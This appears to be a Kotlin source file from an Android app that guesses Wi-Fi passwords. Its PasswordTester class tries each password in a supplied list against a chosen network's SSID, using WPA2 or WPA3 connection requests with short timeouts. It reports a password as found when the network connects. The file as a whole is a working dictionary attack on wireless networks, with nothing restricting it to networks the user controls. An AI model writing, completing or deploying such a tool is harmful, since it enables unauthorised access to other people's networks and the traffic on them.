package com.hotspotapp

import android.content.Context
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.wifi.WifiNetworkSpecifier
import android.os.Handler
import android.os.Looper
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import kotlin.coroutines.resume

sealed class TestResult {
    data class Success(val password: String) : TestResult()
    data class Progress(val currentPassword: String, val index: Int, val total: Int) : TestResult()
    object Failed : TestResult()
    object Cancelled : TestResult()
}

class PasswordTester(private val context: Context) {

    companion object {
        private const val CONNECTION_TIMEOUT_MS = 4000L // 4 sec fast mode
    }

    private val connectivityManager: ConnectivityManager =
        context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

    private var currentCallback: ConnectivityManager.NetworkCallback? = null
    @Volatile private var isCancelled = false

    suspend fun testPasswords(
        network: WifiNetwork,
        passwords: List<String>,
        onResult: (TestResult) -> Unit
    ) = withContext(Dispatchers.IO) {
        isCancelled = false

        for ((index, password) in passwords.withIndex()) {
            if (isCancelled) {
                withContext(Dispatchers.Main) {
                    onResult(TestResult.Cancelled)
                }
                return@withContext
            }

            withContext(Dispatchers.Main) {
                onResult(TestResult.Progress(password, index + 1, passwords.size))
            }

            val success = tryConnect(network.ssid, network.securityType, password)

            if (success) {
                // Disconnect after finding password
                disconnectNetwork()
                withContext(Dispatchers.Main) {
                    onResult(TestResult.Success(password))
                }
                return@withContext
            }

            // Small delay between attempts
            delay(200)
        }

        if (!isCancelled) {
            withContext(Dispatchers.Main) {
                onResult(TestResult.Failed)
            }
        }
    }

    private suspend fun tryConnect(ssid: String, securityType: String, password: String): Boolean =
        suspendCancellableCoroutine { continuation ->

        val specifierBuilder = WifiNetworkSpecifier.Builder()
            .setSsid(ssid)

        when {
            securityType.contains("WPA3") -> specifierBuilder.setWpa3Passphrase(password)
            else -> specifierBuilder.setWpa2Passphrase(password)
        }

        val request = NetworkRequest.Builder()
            .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
            .removeCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .setNetworkSpecifier(specifierBuilder.build())
            .build()

        val handler = Handler(Looper.getMainLooper())
        var isResumed = false

        val callback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                // SUCCESS - Password is correct!
                if (!isResumed) {
                    isResumed = true
                    cleanup(this)
                    continuation.resume(true)
                }
            }

            override fun onUnavailable() {
                // FAILED - Wrong password or user declined
                if (!isResumed) {
                    isResumed = true
                    cleanup(this)
                    continuation.resume(false)
                }
            }
        }

        currentCallback = callback

        // Timeout
        handler.postDelayed({
            if (!isResumed) {
                isResumed = true
                cleanup(callback)
                continuation.resume(false)
            }
        }, CONNECTION_TIMEOUT_MS)

        try {
            connectivityManager.requestNetwork(request, callback, handler, CONNECTION_TIMEOUT_MS.toInt())
        } catch (e: Exception) {
            if (!isResumed) {
                isResumed = true
                continuation.resume(false)
            }
        }

        continuation.invokeOnCancellation {
            if (!isResumed) {
                cleanup(callback)
            }
        }
    }

    private fun cleanup(callback: ConnectivityManager.NetworkCallback) {
        try {
            connectivityManager.unregisterNetworkCallback(callback)
        } catch (_: Exception) {}
    }

    private fun disconnectNetwork() {
        currentCallback?.let { cleanup(it) }
        currentCallback = null
    }

    fun cancel() {
        isCancelled = true
        disconnectNetwork()
    }
}
